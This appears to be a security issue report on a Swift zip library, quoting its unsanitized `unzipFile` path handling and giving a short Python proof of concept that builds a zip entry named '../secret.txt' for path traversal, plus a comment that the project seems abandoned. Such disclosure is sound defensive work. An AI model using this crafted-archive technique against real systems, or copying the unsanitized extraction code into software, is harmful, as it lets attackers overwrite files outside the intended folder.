| **Description:**  The package does not validate paths coming from zip entries, hence allowing for path traversal  **Technical details:**  Below is a code snippet from the `unzipFile` function used to extract zip files, you can notice that `pathString` coming from our zip entry is appended to the `destination` directory without any sanitization  ``` let fileNameSize = Int(fileInfo.size_filename) + 1 //let fileName = UnsafeMutablePointer<CChar>(allocatingCapacity: fileNameSize) let fileName = UnsafeMutablePointer<CChar>.allocate(capacity: fileNameSize)  unzGetCurrentFileInfo64(zip, &fileInfo, fileName, UInt(fileNameSize), nil, 0, nil, 0) fileName[Int(fileInfo.size_filename)] = 0  var pathString = String(cString: fileName)  guard pathString.count > 0 else {     throw ZipError.unzipFail }  var isDirectory = false let fileInfoSizeFileName = Int(fileInfo.size_filename-1) if (fileName[fileInfoSizeFileName] == "/".cString(using: String.Encoding.utf8)?.first || fileName[fileInfoSizeFileName] == "\\".cString(using: String.Encoding.utf8)?.first) {     isDirectory = true; } free(fileName) if pathString.rangeOfCharacter(from: CharacterSet(charactersIn: "/\\")) != nil {     pathString = pathString.replacingOccurrences(of: "\\", with: "/") }  let fullPath = destination.appendingPathComponent(pathString).path ```  **Exploit code:**  ``` import zipfile  def compress_file(filename):     with zipfile.ZipFile('payload.zip', 'w') as zipf:         zipf.writestr(filename, "Test payload")  filename = '../secret.txt'  compress_file(filename) ``` |

| I believe this project is not being maintained anymore so it either has to be mentioned in the README.md or the project owner should look for stewardship to take over the project |
